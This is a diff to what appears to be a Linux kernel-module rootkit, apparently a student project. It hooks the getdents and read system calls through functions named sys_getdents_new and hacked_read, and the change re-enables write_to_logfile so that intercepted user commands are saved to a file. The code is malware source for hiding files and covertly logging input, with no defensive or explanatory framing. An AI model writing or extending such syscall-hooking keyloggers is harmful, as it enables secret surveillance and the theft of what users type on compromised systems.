@@ -47,7 +47,7 @@ asmlinkage long sys_getdents_new(unsigned int fd, struct linux_dirent __user *di
 	struct linux_dirent* ent;
 	long ret = orig_getdents(fd, dirent, count);
 	char* dbuf;
-    printk("Project: Get Dents called");
+    //printk("Project: Get Dents called");
 	if (ret <= 0) {
         printk("ret was <= 0");
 		return ret;
@@ -110,6 +110,8 @@ int write_to_logfile(char *buffer)
 	mm_segment_t fs;
 	loff_t pos = 0;
     int ret;
+
+	printk("WRITE TO LOGFILE: This is the command %s",test_buffer);
 
 	file = filp_open(FILE_PATH,O_WRONLY | O_CREAT | O_TRUNC | O_APPEND, 0644);
 
@@ -352,7 +354,7 @@ asmlinkage int hacked_read(unsigned int fd, char *buf, size_t count)
 			strncat(logger_buffer, "\n", 1);
 			sprintf(test_buffer, "%s", logger_buffer);
             printk("This is the command %s",test_buffer);
-			//write_to_logfile(test_buffer);
+			write_to_logfile(test_buffer);
 			logger_buffer[0] = '\0';
 		}
 		else
